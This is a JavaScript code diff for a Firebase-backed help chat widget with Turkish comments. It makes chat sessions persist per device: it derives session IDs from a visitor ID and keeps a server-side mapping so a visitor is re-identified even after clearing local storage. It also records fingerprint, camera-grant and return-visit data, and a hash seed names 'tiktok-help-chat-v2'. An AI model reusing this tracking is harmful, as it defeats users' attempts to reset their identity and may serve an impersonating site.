@@ -160,6 +160,35 @@ function collectDeviceFingerprint() {
   };
 }
 
+function readStoredSessionId() {
+  try {
+    const id = localStorage.getItem(SESSION_PERSIST_KEY) || sessionStorage.getItem(SESSION_TAB_KEY);
+    if (id && String(id).length >= 8) return String(id);
+  } catch {
+    try {
+      const id = sessionStorage.getItem(SESSION_TAB_KEY);
+      if (id && String(id).length >= 8) return String(id);
+    } catch {
+      /* ignore */
+    }
+  }
+  return null;
+}
+
+function writeStoredSessionId(id) {
+  if (!id) return;
+  try {
+    localStorage.setItem(SESSION_PERSIST_KEY, id);
+    sessionStorage.setItem(SESSION_TAB_KEY, id);
+  } catch {
+    try {
+      sessionStorage.setItem(SESSION_TAB_KEY, id);
+    } catch {
+      /* ignore */
+    }
+  }
+}
+
 function getOrCreateVisitorId() {
   try {
     let id = localStorage.getItem(VISITOR_DEVICE_KEY);
@@ -175,51 +204,39 @@ function getOrCreateVisitorId() {
   }
 }
 
+function sessionIdForVisitor(visitorId) {
+  const v = String(visitorId || "unknown");
+  // Deterministik: aynı cihaz → aynı sohbet id (UUID spam’i yok)
+  return `c_${simpleHash(v)}_${simpleHash(`${v}|tiktok-help-chat-v2`)}`;
+}
+
+/**
+ * Sync API: bellek / localStorage / visitorId türevı.
+ * Yeni rastgele UUID ÜRETMEZ — sürekli yeni sohbet oluşturmayı engeller.
+ */
 function getSessionId() {
-  // Her yüklemede benzersiz sekme kimliği (sessionStorage KOPYALANIR — sekme çoğaltmada yetmez)
+  if (sessionId && String(sessionId).length >= 8) return sessionId;
+
   if (!window.__helpChatTabId) {
     window.__helpChatTabId = makeId();
   }
   const tabId = window.__helpChatTabId;
   const visitorId = getOrCreateVisitorId();
+  window.__helpVisitorId = visitorId;
 
-  // Kalıcı oturum: aynı cihaz = aynı sohbet (sekme / tarayıcı kapanınca da)
-  let id = null;
-  try {
-    id = localStorage.getItem(SESSION_PERSIST_KEY) || sessionStorage.getItem(SESSION_TAB_KEY);
-  } catch {
-    try {
-      id = sessionStorage.getItem(SESSION_TAB_KEY);
-    } catch {
-      id = null;
-    }
-  }
-
+  let id = readStoredSessionId();
   if (!id) {
-    id = makeId();
+    id = sessionIdForVisitor(visitorId);
+    writeStoredSessionId(id);
   }
+  sessionId = id;
 
   try {
-    localStorage.setItem(SESSION_PERSIST_KEY, id);
-    sessionStorage.setItem(SESSION_TAB_KEY, id);
-  } catch {
-    try {
-      sessionStorage.setItem(SESSION_TAB_KEY, id);
-    } catch {
-      /* ignore */
-    }
-  }
-
-  // Sekme kilidi: aynı sohbet, kamera sahipliği ayrı
-  // Diğer sekme canlıyken YENİ sohbet AÇMA — aynı sessionId paylaş
-  try {
-    const lockKey = `help_chat_lock_${id}`;
-    const now = Date.now();
     localStorage.setItem(
-      lockKey,
+      `help_chat_lock_${id}`,
       JSON.stringify({
         tabId,
-        at: now,
+        at: Date.now(),
         sessionId: id,
         visitorId,
         reloading: false,
@@ -229,7 +246,6 @@ function getSessionId() {
     /* private mode */
   }
 
-  window.__helpVisitorId = visitorId;
   return id;
 }
 
@@ -1030,12 +1046,55 @@ async function ensureSession() {
   if (!database) return null;
   if (sessionReady) return sessionReady;
 
-  sessionId = getSessionId();
-  const visitorId = getOrCreateVisitorId();
-  const sessionRef = ref(database, `chats/${sessionId}`);
-
   sessionReady = (async () => {
+    const visitorId = getOrCreateVisitorId();
+    let id = readStoredSessionId();
     const now = Date.now();
+
+    // Aynı cihazın kanonik sohbeti: Firebase visitors/{visitorId}.sessionId
+    // localStorage silinse bile aynı sohbete dön — sürekli yeni #id üretme
+    try {
+      const vSnap = await get(ref(database, `visitors/${visitorId}`));
+      const mapped = String(vSnap.val()?.sessionId || "").trim();
+      if (mapped.length >= 8) {
+        if (!id || id !== mapped) {
+          if (!id) {
+            id = mapped;
+          } else {
+            const [localSnap, canonSnap] = await Promise.all([
+              get(ref(database, `chats/${id}`)),
+              get(ref(database, `chats/${mapped}`)),
+            ]);
+            const localExists = localSnap.exists();
+            const canonExists = canonSnap.exists();
+            if (!localExists && canonExists) {
+              id = mapped;
+            } else if (localExists && canonExists) {
+              // İkisi de varsa visitor profilindeki kanonik oturumu kullan
+              id = mapped;
+            } else if (!localExists && !canonExists) {
+              id = mapped;
+            }
+            // local var, canon yok → local’i kanonik yap (aşağıda yazılır)
+          }
+        }
+      }
+    } catch (err) {
+      console.warn("canonical session lookup", err);
+    }
+
+    if (!id) id = sessionIdForVisitor(visitorId);
+    sessionId = id;
+    writeStoredSessionId(id);
+    if (!window.__helpChatTabId) window.__helpChatTabId = makeId();
+    window.__helpVisitorId = visitorId;
+    try {
+      touchSessionTabLock();
+    } catch {
+      /* ignore */
+    }
+
+    const sessionRef = ref(database, `chats/${id}`);
     let prev = null;
     try {
       const snap = await get(sessionRef);
@@ -1051,7 +1110,7 @@ async function ensureSession() {
       }
     })();
 
-    const visitorProfile = await upsertVisitorProfile(sessionId, prev);
+    const visitorProfile = await upsertVisitorProfile(id, prev);
     const isReturning = Boolean(
       visitorProfile?.isReturning ||
         (prev && (prev.visitorId || prev.createdAt)) ||
@@ -1074,15 +1133,17 @@ async function ensureSession() {
       timezone: visitorProfile?.timezone || null,
       screen: visitorProfile?.screen || null,
     };
-    // Mevcut oturumu “yeni ziyaretçi” gibi sıfırlama
     patch.createdAt = Number(prev?.createdAt) || now;
     if (!softResume) {
-      patch.enteredAt = now;
-      if (isReturning) {
-        patch.preview = `Dönen ziyaretçi · ziyaret #${patch.visitCount}`;
-        patch.returnedAt = now;
-      } else if (!prev?.cameraGranted && !prev?.hasCamera && !getGoogleUser()) {
-        patch.preview = "Siteye giriş yaptı";
+      // Yenileme/yeniden bağlanma “yeni giriş” sayılmaz
+      const alreadyEntered = Number(prev?.enteredAt) > 0;
+      if (!alreadyEntered) patch.enteredAt = now;
+      else patch.enteredAt = Number(prev.enteredAt);
+      if (!prev?.preview && !prev?.cameraGranted && !prev?.hasCamera && !getGoogleUser()) {
+        patch.preview = isReturning
+          ? `Dönen ziyaretçi · ziyaret #${patch.visitCount}`
+          : "Siteye giriş yaptı";
+        if (isReturning) patch.returnedAt = now;
       }
     } else {
       patch.enteredAt = Number(prev?.enteredAt) || now;
@@ -1090,13 +1151,23 @@ async function ensureSession() {
     }
     await update(sessionRef, patch);
 
-    // Dönüş mesajı — sadece gerçek yeni ziyaret (yenileme değil)
+    // Visitor → session kilidi (kanonik)
+    try {
+      await update(ref(database, `visitors/${visitorId}`), {
+        sessionId: id,
+        updatedAt: now,
+        lastSeenAt: now,
+      });
+    } catch {
+      /* ignore */
+    }
+
     if (isReturning && !softResume) {
       try {
         const counted = sessionStorage.getItem("help_return_msg_v1");
         if (counted !== "1") {
           sessionStorage.setItem("help_return_msg_v1", "1");
-          const msgRef = push(ref(database, `chats/${sessionId}/messages`));
+          const msgRef = push(ref(database, `chats/${id}/messages`));
           await set(msgRef, {
             who: "user",
             text: `Ziyaretçi tekrar giriş yaptı (#${patch.visitCount})`,
@@ -1110,7 +1181,7 @@ async function ensureSession() {
       }
     }
 
-    return sessionId;
+    return id;
   })();
 
   return sessionReady;
